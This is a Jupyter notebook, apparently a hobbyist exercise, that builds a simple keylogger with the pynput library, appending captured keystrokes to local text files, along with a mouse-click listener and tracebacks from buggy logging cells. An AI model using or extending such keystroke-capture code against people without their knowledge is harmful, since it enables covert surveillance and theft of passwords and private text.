{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key logger Application \n"
     ]
    }
   ],
   "source": [
    "print(\"Key logger Application \")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.enter released\n",
      "Key.shift_r released\n",
      "alphanumeric key q pressed\n",
      "'q' released\n",
      "special key Key.shift_r pressed\n",
      "special key Key.enter pressed\n",
      "Key.enter released\n",
      "Key.shift_r released\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        print('alphanumeric key {0} pressed'.format(\n",
    "            key.char))\n",
    "        with open(\"keylogger.txt\", \"a+\") as file:\n",
    "            file.write(key.char)\n",
    "    except AttributeError:\n",
    "        print('special key {0} pressed'.format(\n",
    "            key))\n",
    "\n",
    "def on_release(key):\n",
    "    print('{0} released'.format(\n",
    "        key))\n",
    "    if key == keyboard.Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "# Collect events until released\n",
    "with keyboard.Listener(\n",
    "        on_press=on_press,\n",
    "        on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# ...or, in a non-blocking fashion:\n",
    "listener = keyboard.Listener(\n",
    "    on_press=on_press,\n",
    "    on_release=on_release)\n",
    "listener.start()"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Unhandled exception in listener callback\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\win32.py\", line 382, in _handler\n",
      "    converted = self._convert(code, msg, lpdata)\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\win32.py\", line 397, in _convert\n",
      "    raise NotImplementedError()\n",
      "NotImplementedError\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 162, in inner\n",
      "    return f(self, *args, **kwargs)\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\win32.py\", line 386, in _handler\n",
      "    self._handle(code, msg, lpdata)\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\mouse\\_win32.py\", line 190, in _handle\n",
      "    self.on_click(data.pt.x, data.pt.y, button, pressed)\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 78, in inner\n",
      "    if f(*args) is False:\n",
      "  File \"<ipython-input-4-665870ce3c9d>\", line 7, in on_click\n",
      "    raise MyException(button)\n",
      "MyException: Button.left\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Button.left was clicked\n"
     ]
    }
   ],
   "source": [
    "from pynput import mouse\n",
    "\n",
    "class MyException(Exception): pass\n",
    "\n",
    "def on_click(x, y, button, pressed):\n",
    "    if button == mouse.Button.left:\n",
    "        raise MyException(button)\n",
    "\n",
    "# Collect events until released\n",
    "with mouse.Listener(\n",
    "        on_click=on_click) as listener:\n",
    "    try:\n",
    "        listener.join()\n",
    "    except MyException as e:\n",
    "        print('{0} was clicked'.format(e.args[0]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Unhandled exception in listener callback\n",
      "Traceback (most recent call last):\n",
      "  File \"<ipython-input-7-8ade101099e1>\", line 14, in on_press\n",
      "    file.write(key.char + \"\\n\")\n",
      "AttributeError: 'Key' object has no attribute 'char'\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 162, in inner\n",
      "    return f(self, *args, **kwargs)\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\keyboard\\_win32.py\", line 274, in _process\n",
      "    self.on_press(key)\n",
      "  File \"C:\\Users\\Katlic\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 78, in inner\n",
      "    if f(*args) is False:\n",
      "  File \"<ipython-input-7-8ade101099e1>\", line 17, in on_press\n",
      "    file.write(key + \"\\n\")\n",
      "TypeError: unsupported operand type(s) for +: 'Key' and 'str'\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "special key Key.backspace pressed\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "unsupported operand type(s) for +: 'Key' and 'str'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-7-8ade101099e1>\u001b[0m in \u001b[0;36mon_press\u001b[1;34m(key)\u001b[0m\n\u001b[0;32m     13\u001b[0m         \u001b[1;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"new_key_capture.txt\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m\"a+\"\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0mfile\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 14\u001b[1;33m             \u001b[0mfile\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mwrite\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mkey\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mchar\u001b[0m \u001b[1;33m+\u001b[0m \u001b[1;34m\"\\n\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     15\u001b[0m     \u001b[1;32mexcept\u001b[0m \u001b[0mAttributeError\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mAttributeError\u001b[0m: 'Key' object has no attribute 'char'",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-7-8ade101099e1>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m     26\u001b[0m         \u001b[0mon_press\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mon_press\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     27\u001b[0m         on_release=on_release) as listener:\n\u001b[1;32m---> 28\u001b[1;33m     \u001b[0mlistener\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     29\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     30\u001b[0m \u001b[1;31m# ...or, in a non-blocking fashion:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m~\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\u001b[0m in \u001b[0;36mjoin\u001b[1;34m(self, *args)\u001b[0m\n\u001b[0;32m    208\u001b[0m         \u001b[1;32mexcept\u001b[0m \u001b[0mTypeError\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    209\u001b[0m             \u001b[1;32mreturn\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 210\u001b[1;33m         \u001b[0msix\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mreraise\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mexc_type\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mexc_value\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mexc_traceback\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    211\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    212\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m~\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\six.py\u001b[0m in \u001b[0;36mreraise\u001b[1;34m(tp, value, tb)\u001b[0m\n\u001b[0;32m    690\u001b[0m                 \u001b[0mvalue\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mtp\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    691\u001b[0m             \u001b[1;32mif\u001b[0m \u001b[0mvalue\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m__traceback__\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[0mtb\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 692\u001b[1;33m                 \u001b[1;32mraise\u001b[0m \u001b[0mvalue\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mwith_traceback\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mtb\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    693\u001b[0m             \u001b[1;32mraise\u001b[0m \u001b[0mvalue\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    694\u001b[0m         \u001b[1;32mfinally\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m~\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\u001b[0m in \u001b[0;36minner\u001b[1;34m(self, *args, **kwargs)\u001b[0m\n\u001b[0;32m    160\u001b[0m             \u001b[1;31m# pylint: disable=W0702; we want to catch all exception\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    161\u001b[0m             \u001b[1;32mtry\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 162\u001b[1;33m                 \u001b[1;32mreturn\u001b[0m \u001b[0mf\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mself\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m*\u001b[0m\u001b[0margs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    163\u001b[0m             \u001b[1;32mexcept\u001b[0m \u001b[0mException\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    164\u001b[0m                 \u001b[1;32mif\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[0misinstance\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0me\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_HANDLED_EXCEPTIONS\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m~\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\keyboard\\_win32.py\u001b[0m in \u001b[0;36m_process\u001b[1;34m(self, wparam, lparam)\u001b[0m\n\u001b[0;32m    272\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    273\u001b[0m         \u001b[1;32mif\u001b[0m \u001b[0mmsg\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_PRESS_MESSAGES\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 274\u001b[1;33m             \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mon_press\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mkey\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    275\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    276\u001b[0m         \u001b[1;32melif\u001b[0m \u001b[0mmsg\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_RELEASE_MESSAGES\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m~\\AppData\\Local\\Continuum\\anaconda3\\lib\\site-packages\\pynput\\_util\\__init__.py\u001b[0m in \u001b[0;36minner\u001b[1;34m(*args)\u001b[0m\n\u001b[0;32m     76\u001b[0m         \u001b[1;32mdef\u001b[0m \u001b[0mwrapper\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mf\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     77\u001b[0m             \u001b[1;32mdef\u001b[0m \u001b[0minner\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m*\u001b[0m\u001b[0margs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 78\u001b[1;33m                 \u001b[1;32mif\u001b[0m \u001b[0mf\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m*\u001b[0m\u001b[0margs\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mFalse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     79\u001b[0m                     \u001b[1;32mraise\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mStopException\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     80\u001b[0m             \u001b[1;32mreturn\u001b[0m \u001b[0minner\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m<ipython-input-7-8ade101099e1>\u001b[0m in \u001b[0;36mon_press\u001b[1;34m(key)\u001b[0m\n\u001b[0;32m     15\u001b[0m     \u001b[1;32mexcept\u001b[0m \u001b[0mAttributeError\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     16\u001b[0m         \u001b[1;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"new_key_capture.txt\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m\"a+\"\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0mfile\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 17\u001b[1;33m             \u001b[0mfile\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mwrite\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mkey\u001b[0m \u001b[1;33m+\u001b[0m \u001b[1;34m\"\\n\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     18\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     19\u001b[0m \u001b[1;32mdef\u001b[0m \u001b[0mon_release\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mkey\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mTypeError\u001b[0m: unsupported operand type(s) for +: 'Key' and 'str'"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "special key Key.backspace pressed\n",
      "special key Key.delete pressed\n",
      "special key Key.ctrl_l pressed\n",
      "special key Key.backspace pressed\n",
      "special key Key.ctrl_l pressed\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "mappings = {8: \"<backspace>\", 13: \"\\n\", 27: \"<esc>\", 32: \" \", 46: \"<del>\", 91: \"<win>\",\n",
    "                160: \"<shft>\", 162: \"<ctrl>\", 163: \"<r-ctrl>\", 164: \"<alt>\", 165: \"<ralt>\", 9: \"<tab>\",\n",
    "                48: \"0\", 49: \"1\", 50: \"2\", 51: \"3\", 52: \"4\", 53: \"5\", 54: \"6\", 55: \"7\", 56: \"8\", 57: \"9\",\n",
    "                37: \"←\", 38: \"↑\", 39: \"→\", 40: \"↓\",\n",
    "                192: \"ö\", 222: \"ä\", 186: \"ü\", 187: \"+\", 191: \"#\",\n",
    "                188: \",\", 190: \".\", 189: \"-\", 219: \"ß\", 221: \"´\", 107: \"+\", 109: \"-\", 111: \"/\", 106: \"*\"\n",
    "                }\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(\"new_key_capture.txt\", \"a+\") as file:\n",
    "            file.write(key.char + \"\\n\")\n",
    "    except AttributeError:\n",
    "        with open(\"new_key_capture.txt\", \"a+\") as file:\n",
    "            file.write(key + \"\\n\")\n",
    "\n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "# Collect events until released\n",
    "with keyboard.Listener(\n",
    "        on_press=on_press,\n",
    "        on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# ...or, in a non-blocking fashion:\n",
    "listener = keyboard.Listener(\n",
    "    on_press=on_press,\n",
    "    on_release=on_release)\n",
    "listener.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "import sys\n",
    "def on_press(key):\n",
    "    try:\n",
    "#         print('alphanumeric key {0} pressed'.format(\n",
    "#             key.char))\n",
    "        if key.char == \"q\":\n",
    "            sys.exit(0)\n",
    "            \n",
    "        with open('keylogger.txt','a') as f:\n",
    "            f.write('special key {0} pressed'.format(\n",
    "            key)+\"\\n\")\n",
    "    except AttributeError:\n",
    "#         print('special key {0} pressed'.format(\n",
    "#             key))\n",
    "        with open('keylogger.txt','a') as f:\n",
    "            f.write('special key {0} pressed'.format(\n",
    "            key)+\"\\n\")\n",
    "\n",
    "def on_release(key):\n",
    "#     print('{0} released'.format(\n",
    "#         key))\n",
    "    with open('keylogger.txt','a') as f:\n",
    "            f.write('special key {0} pressed'.format(\n",
    "            key)+\"\\n\")\n",
    "    if key == keyboard.Key.esc:\n",
    "        # Stop listener\n",
    "        with open('keylogger.txt','a') as f:\n",
    "            f.write('special key {0} pressed'.format(\n",
    "            key)+\"\\n\")\n",
    "        return False\n",
    "\n",
    "# Collect events until released\n",
    "with keyboard.Listener(\n",
    "        on_press=on_press,\n",
    "        on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# ...or, in a non-blocking fashion:\n",
    "listener = keyboard.Listener(\n",
    "    on_press=on_press,\n",
    "    on_release=on_release)\n",
    "listener.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
